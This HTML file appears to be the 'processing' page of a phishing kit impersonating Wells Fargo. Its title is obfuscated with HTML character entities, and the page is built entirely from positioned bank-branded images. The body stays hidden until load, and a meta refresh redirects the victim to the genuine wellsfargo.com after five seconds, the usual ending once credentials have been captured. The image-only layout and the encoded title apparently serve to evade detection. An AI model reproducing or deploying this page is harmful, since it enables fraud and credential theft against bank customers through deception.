<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#87;&#101;&#108;&#108;&#115;&#32;&#70;&#97;&#114;&#103;&#111;&#32;&#45;&#32;&#80;&#114;&#111;&#99;&#101;&#115;&#115;&#105;&#110;&#103;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<html><meta http-equiv="Refresh" content="05; url=https://www.wellsfargo.com"></html>			  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:189px; top:33px; width:64px; height:65px; z-index:0"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=64 height=65></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:1044px; top:75px; width:96px; height:17px; z-index:1"><a href="#"><img src="images/secu.png" alt="" title="" border=0 width=96 height=17></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:109px; width:1349px; height:16px; z-index:2"><img src="images/wf17.png" alt="" title="" border=0 width=1349 height=16></div>

<div id="image6" style="position:absolute; overflow:hidden; left:227px; top:627px; width:409px; height:50px; z-index:3"><img src="images/wf20.png" alt="" title="" border=0 width=409 height=50></div>

<div id="image7" style="position:absolute; overflow:hidden; left:236px; top:568px; width:614px; height:40px; z-index:4"><a href="#"><img src="images/wf21.png" alt="" title="" border=0 width=614 height=40></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:182px; top:157px; width:518px; height:65px; z-index:5"><img src="images/wf25.png" alt="" title="" border=0 width=518 height=65></div>

<div id="image5" style="position:absolute; overflow:hidden; left:608px; top:334px; width:142px; height:142px; z-index:6"><img src="images/wf.gif" alt="" title="" border=0 width=142 height=142></div>

</div>

</body>
</html>
